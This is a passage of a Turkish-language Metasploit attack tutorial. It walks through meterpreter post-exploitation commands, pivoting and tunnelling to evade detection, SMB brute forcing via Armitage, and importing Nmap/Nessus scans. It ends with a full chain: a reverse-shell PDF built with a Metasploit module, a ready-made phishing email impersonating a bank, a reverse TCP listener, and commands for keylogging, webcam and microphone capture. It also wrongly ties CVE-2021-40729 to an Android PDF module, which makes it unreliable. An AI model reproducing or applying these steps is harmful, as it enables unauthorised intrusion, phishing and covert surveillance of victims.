run [SCRIPT] # hedef sistemde script çalıştırır
background # meterpreter oturumunu arka plana alır
sessions # mevcut oturumları listeler
sessions -i [ID] # belirli bir oturuma geçer
exit # meterpreter oturumundan çıkar
Bu komutlar, hedef sistem üzerinde çeşitli işlemler yapmamızı sağlar. Bu işlemler, hedef sistemin bilgilerini almak, kullanıcı adını ve parolalarını çalmak, ekran görüntüsü ve web kamera fotoğrafı almak, klavye tuşlarını kaydetmek, dosya indirmek ve yüklemek, komut satırı açmak, script çalıştırmak gibi işlemlerdir.
Bu adımları takip ederek, metasploit kullanarak antivirüs atlatma işlemini tamamladınız. Artık hedef sistem üzerinde istediğiniz işlemleri yapabilirsiniz. Ancak, bu işlemleri yaparken dikkatli olmanız gerekir. Çünkü, hedef sistemdeki güvenlik önlemleri, ağ trafiğini izleyebilir, anormal davranışları tespit edebilir veya sizin bağlantınızı kesmeye çalışabilir. Bu nedenle, bağlantınızı korumak ve gizlemek için bazı teknikler kullanmanız gerekebilir. Bu teknikler, şunlardır:
Port forwarding: Bu teknik, hedef sistemdeki bir portu, saldırgan makinesindeki bir porta yönlendirir. Böylece, hedef sistemdeki bir servise veya uygulamaya, saldırgan makinesinden erişilebilir. Örneğin, hedef sistemdeki 3389 portunda çalışan uzak masaüstü servisine, saldırgan makinesindeki 4445 portundan erişmek için, aşağıdaki komutu kullanabilirsiniz:
meterpreter > portfwd add -l 4445 -p 3389 -r 127.0.0.1
Bu komut, hedef sistemdeki 3389 portunu, saldırgan makinesindeki 4445 portuna yönlendirir. Bu sayede, saldırgan makinesinden uzak masaüstü bağlantısı kurabilirsiniz.
Pivoting: Bu teknik, hedef sistemdeki bir ağ arayüzünü, saldırgan makinesindeki bir ağ arayüzü gibi kullanmaktır. Böylece, hedef sistemdeki ağa bağlı olan diğer sistemlere, saldırgan makinesinden erişilebilir. Örneğin, hedef sistemdeki 192.168.2.0/24 ağına, saldırgan makinesinden erişmek için, aşağıdaki komutları kullanabilirsiniz:
meterpreter > run autoroute -s 192.168.2.0/24 # hedef sistemdeki ağ arayüzünü yönlendirir
meterpreter > background # meterpreter oturumunu arka plana alır
msf > use auxiliary/server/socks4a # socks4a proxy sunucusunu kullanır
msf auxiliary(socks4a) > set SRVPORT 1080 # proxy sunucusunun portunu belirtir
msf auxiliary(socks4a) > run # proxy sunucusunu çalıştırır
Bu komutlar, hedef sistemdeki 192.168.2.0/24 ağ arayüzünü yönlendirir, meterpreter oturumunu arka plana alır, socks4a proxy sunucusunu kullanır, proxy sunucusunun portunu belirtir ve proxy sunucusunu çalıştırır. Bu sayede, saldırgan makinesindeki bir tarayıcı veya tarama aracı ile, hedef sistemdeki ağa bağlı olan diğer sistemlere erişebilirsiniz.
Tunneling: Bu teknik, hedef sistemdeki bir ağ trafiğini, saldırgan makinesindeki bir ağ trafiği gibi göstermektir. Böylece, hedef sistemdeki güvenlik önlemlerini atlatmak veya gizli kalmak mümkün olur. Örneğin, hedef sistemdeki bir web sitesine, saldırgan makinesindeki bir web tarayıcısı ile erişmek için, aşağıdaki komutları kullanabilirsiniz:
meterpreter > run autoroute -s 192.168.2.0/24 # hedef sistemdeki ağ arayüzünü yönlendirir
meterpreter > background # meterpreter oturumunu arka plana alır
msf > use auxiliary/server/socks4a # socks4a proxy sunucusunu kullanır
msf auxiliary(socks4a) > set SRVPORT 1080 # proxy sunucusunun portunu belirtir
msf auxiliary(socks4a) > run # proxy sunucusunu çalıştırır
Bu komutlar, hedef sistemdeki 192.168.2.0/24 ağ arayüzünü yönlendirir, meterpreter oturumunu arka plana alır, socks4a proxy sunucusunu kullanır, proxy sunucusunun portunu belirtir ve proxy sunucusunu çalıştırır. Bu sayede, saldırgan makinesindeki bir web tarayıcısının ayarlarını değiştirerek, proxy sunucusunu kullanabilir ve hedef sistemdeki web sitesine erişebilirsiniz.
Bu teknikleri kullanarak, metasploit kullanarak antivirüs atlatma işlemini daha etkili ve güvenli bir şekilde yapabilirsiniz.
Armitage Metasploit Pratik Kullanımı
Armitage, Metasploit Framework'ün grafiksel bir arayüzüdür. Metasploit, ağlardaki güvenlik açıklarını bulmak ve istismar etmek için kullanılan popüler bir araçtır. Armitage, Metasploit'in özelliklerini kolayca kullanmanızı sağlar. Armitage'i kullanmak için aşağıdaki adımları izleyebilirsiniz:
Adım: Armitage uygulamasını başlatın. Armitage'i Windows, Linux veya macOS üzerinde çalıştırabilirsiniz. Armitage'i indirin. Armitage'i başlatmak için, terminalde armitage komutunu yazın veya Armitage simgesine çift tıklayın. Armitage, Metasploit'i otomatik olarak başlatacaktır. Armitage'i ilk kez çalıştırdığınızda, bağlanmak istediğiniz Metasploit sunucusunun ayarlarını girmeniz istenecektir. Varsayılan ayarları kullanabilir veya kendi ayarlarınızı yapabilirsiniz.
Adım: İstediğiniz modülü arayın. Armitage, Metasploit'in sunduğu çok sayıda modülü içerir. Bu modüller, farklı hedef sistemlere ve servislere saldırmak için kullanılabilir. Modülleri aramak için, sol üst köşedeki arama kutusunu kullanabilirsiniz. Örneğin, SMB servisine kaba kuvvet saldırısı yapmak için smb_login modülünü arayabilirsiniz. İlgili modülü bulduktan sonra, üzerine çift tıklayarak modül ayarlarını açabilirsiniz.
Adım: Modül ayarlarını girin ve çalıştırın. Modül ayarlarını açtığınızda, modülün gerektirdiği seçenekleri göreceksiniz. Bu seçenekler, modülün hangi hedeflere, hangi portlara, hangi kullanıcı adı ve şifre kombinasyonlarıyla saldıracağını belirler. Seçenekleri doldurduktan sonra, Launch (Başlat) düğmesine tıklayarak modülü çalıştırabilirsiniz. Modül çalıştığında, başarılı girişleri ve diğer sonuçları görebilirsiniz.
Adım: Bulduğunuz sunucuya yönelik bir port taraması yapın. Modül çalıştırdıktan sonra, hedef sunucunun hangi portlarda hangi servisleri çalıştırdığını öğrenmek için bir port taraması yapabilirsiniz. Port taraması yapmak için, hedef sunucunun üzerine sağ tıklayın ve Nmap Scan (Nmap Taraması) seçeneğini seçin. Ardından, istediğiniz tarama türünü seçin. Örneğin, hızlı bir tarama yapmak için Quick Scan (Hızlı Tarama) seçeneğini seçebilirsiniz. Tarama bittiğinde, sonuçları görebilirsiniz.
Armitage, Metasploit'in daha fazla özelliğini kullanmanızı sağlar. Örneğin, hedef sunuculara sızabilir, dosya aktarabilir, komut çalıştırabilir, keylogger kurabilir, ekran görüntüsü alabilir ve daha fazlasını yapabilirsiniz.
Nmap/Nessus Çıktılarını Metasploit’te Kullanma
Nmap, Nessus ve Metasploit gibi araçları kullanarak ağ güvenliği testleri yapabilirsiniz. Bu araçlar, hedef sistemlerin zayıf noktalarını bulmanıza ve istismar etmenize olanak sağlar.
Aşağıdaki adımları izleyerek ağ güvenliği testi yapın.
Adım: Metasploit'in ihtiyacı olan postgresql veritabanının kurulması;
Metasploit, postgresql veritabanını kullanarak tarama sonuçlarını saklar ve yönetir. Bu yüzden, postgresql veritabanını kurmanız gerekmektedir. Bunun için, terminalde şu komutu yazınız:
sudo apt-get install postgresql
Adım: Postgres servisinin başlatılması;
Postgresql veritabanını kullanabilmek için, postgres servisini başlatmanız gerekmektedir. Bunun için, terminalde şu komutu yazınız:
sudo systemctl start postgresql
Adım: Postgres kullanıcısına parola verilmesi;
Postgresql veritabanına bağlanabilmek için, postgres kullanıcısına bir parola belirlemeniz gerekmektedir. Bunun için, terminalde şu komutları yazınız:
sudo -u postgres psql
\password postgres
Bu komutlar, postgres kullanıcısının parolasını değiştirmenizi sağlar. Parolanızı iki kez girmeniz istenecektir. Parolanızı unutmayınız.
Adım: Metasploit'i başlatmadan önce Nmap ile bulunduğumuz subneti tarayarak bunu xml formatında(-oX) kaydedelim ve bunu metasploite yükleyelim.
Nmap, ağ taraması yapmak için kullanılan bir araçtır. Nmap ile hedef sistemlerin açık portlarını, çalışan servislerini, işletim sistemlerini ve daha birçok bilgiyi elde edebilirsiniz. Nmap ile yaptığınız taramaları, xml formatında kaydederek, metasploit ile kullanabilirsiniz. Bunun için, terminalde şu komutu yazınız:
sudo nmap 192.168.1.0/24 -n -v -T5 -oX nmap-cikti.xml
Bu komut, 192.168.1.0/24 subnetindeki tüm IP adreslerini tarar, açık portlarını, çalışan servislerini ve işletim sistemlerini belirler, tarama sonucunu nmap-cikti.xml dosyasına kaydeder. Bu dosyayı, metasploit ile kullanacağız.
Adım: Şimdi metasploit'i başlatalım ve postgresql ile bağlantısını gerçekleştirelim;
Metasploit, güvenlik açıklarını bulmak ve istismar etmek için kullanılan bir araçtır. Metasploit, nmap ve nessus gibi araçların çıktılarını kullanarak, hedef sistemlere saldırı yapabilir. Metasploit'i başlatmak için, terminalde şu komutu yazınız:
sudo msfconsole
Bu komut, metasploit konsolunu açar. Metasploit konsolunda, postgresql veritabanına bağlanmak için, şu komutu yazınız:
db_connect postgres:@127.0.0.1/testdb
Bu komut, postgres kullanıcısı ve belirlediğiniz parola ile postgresql veritabanına bağlanır. testdb isimli bir veritabanı oluşturur ve metasploit için gerekli tabloları oluşturur.
Adım: Yukarıda 4.adımda yaptığımız nmap çıktısını metasploit'e yükleyelim (aynı şekilde .nessus uzantılı Nessus çıktıları da yüklenebilir);
Metasploit, nmap ve nessus gibi araçların çıktılarını kullanarak, hedef sistemlerin zayıf noktalarını bulabilir ve istismar edebilir. Bunun için, nmap veya nessus ile yaptığınız taramaları, metasploit'e yüklemeniz gerekmektedir. Bunun için, metasploit konsolunda, şu komutu yazınız:
db_import /root/nmap-cikti.xml
Bu komut, nmap ile yaptığınız taramanın sonucunu, metasploit veritabanına aktarır. Eğer nessus ile yaptığınız bir tarama sonucunu yüklemek isterseniz, şu komutu yazabilirsiniz:
db_import /root/nessus-cikti.nessus
Adım: Yalnızca ayakta olan (up) hostları görelim;
Metasploit veritabanına aktardığınız tarama sonuçlarını, metasploit konsolunda görebilirsiniz. Örneğin, tarama yaptığınız ağdaki ayakta olan hostları görmek için, şu komutu yazınız:
hosts -u
Bu komut, tarama yaptığınız ağdaki IP adreslerini, hostname'lerini, işletim sistemlerini ve durumlarını listeler. Burada, durumu "up" olan hostlar, ayakta olan hostlardır.
Adım: Ayakta olan sunuculardan 445 veya 21 portu açık olanları listeleyelim;
Metasploit veritabanına aktardığınız tarama sonuçlarını, metasploit konsolunda filtreleyebilirsiniz. Örneğin, ayakta olan sunuculardan 445 veya 21 portu açık olanları görmek için, şu komutu yazınız:
services -p 445,21 -u
Bu komut, tarama yaptığınız ağdaki IP adreslerini, port numaralarını, servis isimlerini, protokollerini ve durumlarını listeler. Burada, durumu "up" olan ve port numarası 445 veya 21 olan servisler, ilgilendiğimiz servislerdir.
Bu adımları takip ederek, nmap, nessus ve metasploit araçlarını kullanarak ağ güvenliği testleri yapabilirsiniz.
Metasploit Kullanarak out-of-bounds Okuma zafiyeti İstismarı
Bu zafiyet CVE-2021-40729 olarak tanımlanmıştır ve Adobe Reader DC versiyon 21.007.20095 (ve önceki), 21.007.20096 (ve önceki), 20.004.30015 (ve önceki) ve 17.011.30202 (ve önceki) sürümlerini etkilemektedir. Bu zafiyet, hafızadan hassas bilgileri ifşa etmeye yol açabilecek bir out-of-bounds okuma zafiyetidir. Bir saldırgan, bu zafiyeti ASLR gibi önlemleri atlatmak için kullanabilir.
Bu zafiyeti istismar etmek için aşağıdaki adımları izleyebilirsiniz:
Adım: Öncelikle bize reverse shell açacak pdf dosyamızı oluşturalım. Bunun için Metasploit'te exploit/android/fileformat/adobe_reader_pdf_js_interface modülünü kullanabiliriz. Bu modül, android/webview_addjavascriptinterface tarayıcı exploit'ini bir PDF içine gömer ve zafiyetli Reader sürümlerinde komut kabuğu almayı sağlar. Bu modülü kullanmak için şu komutları girebiliriz:
msf > use exploit/android/fileformat/adobe_reader_pdf_js_interface
msf exploit(adobe_reader_pdf_js_interface) > show options
msf exploit(adobe_reader_pdf_js_interface) > set FILENAME shell.pdf
msf exploit(adobe_reader_pdf_js_interface) > set INFILENAME legit.pdf
msf exploit(adobe_reader_pdf_js_interface) > set LHOST
msf exploit(adobe_reader_pdf_js_interface) > exploit
Bu komutlar, legit.pdf adlı meşru bir PDF dosyasını shell.pdf adlı zafiyetli bir PDF dosyasıyla birleştirir. LHOST parametresi, reverse shell bağlantısı için kendi IP adresimizi belirtir.
Adım: Oluşturulan shell.pdf dosyasını hedefe ulaştırmak için sosyal mühendislik teknikleri kullanabiliriz. Örneğin, bankadan gönderiliyormuş gibi bir e-posta hazırlayabilir ve PDF dosyasını e-postaya ekleyebiliriz. E-posta içeriği şöyle olabilir:
Subject: Banka hesap özeti
Body: Sayın müşterimiz,
Banka hesabınızın son durumunu görmek için lütfen ekteki PDF dosyasını açınız. Bu dosya, güvenliğiniz için şifreli ve sıkıştırılmıştır. Şifre: 1234
Saygılarımızla,
Banka müşteri hizmetleri
Adım: Hedef sistemde e-posta açılmadan önce biz pusumuzu kuruyoruz. Ve ilgili dosyanın açılmasını bekliyoruz. Bunun için Metasploit'te exploit/multi/handler modülünü kullanarak reverse shell bağlantısını dinlemeye başlıyoruz. Bu modül, herhangi bir payload için genel bir handler sağlar. Bu modülü kullanmak için şu komutları girebiliriz:
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD android/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST
msf exploit(handler) > exploit
Bu komutlar, android/meterpreter/reverse_tcp payload'ını kullanarak reverse shell bağlantısını dinler. LHOST parametresi, kendi IP adresimizi belirtir.
Adım: Hedef sistemde e-posta açılıp ilgili PDF okunmak istendiğinde bize aşağıdaki gibi meterpreter oturumu düşecektir:
msf exploit(handler) > exploit
[] Started reverse TCP handler on :4444
[] Sending stage (70668 bytes) to
[*] Meterpreter session 1 opened (:4444 -> :49160) at 2024-01-26 14:35:12 +0300
meterpreter >
Bu noktadan sonra, meterpreter komutlarını kullanarak hedef sistemi kontrol edebiliriz. Örneğin, hedef sistemin dosya sistemine erişmek için cd, ls, cat, download, upload gibi komutları kullanabiliriz. Hedef sistemin işletim sistemine erişmek için shell komutunu kullanabiliriz. Hedef sistemin kamerasını, mikrofonunu veya klavyesini izlemek için webcam_snap, webcam_stream, record_mic, keyscan_start, keyscan_dump gibi komutları kullanabiliriz. Hedef sistemin ağ trafiğini izlemek için portfwd, route, arp, netstat, ipconfig gibi komutları kullanabiliriz. Hedef sistemin ekranını izlemek için screenshot komutunu kullanabiliriz. Hedef sistemin kullanıcılarını, gruplarını, uygulamalarını veya servislerini listelemek için getuid, getprivs, ps, sysinfo, getpid, get_processes, get_services gibi komutları kullanabiliriz. Hedef sisteme yeni bir payload enjekte etmek için execute, run, upload gibi komutları kullanabiliriz. Hedef sistemden çıkmak için exit komutunu kullanabiliriz.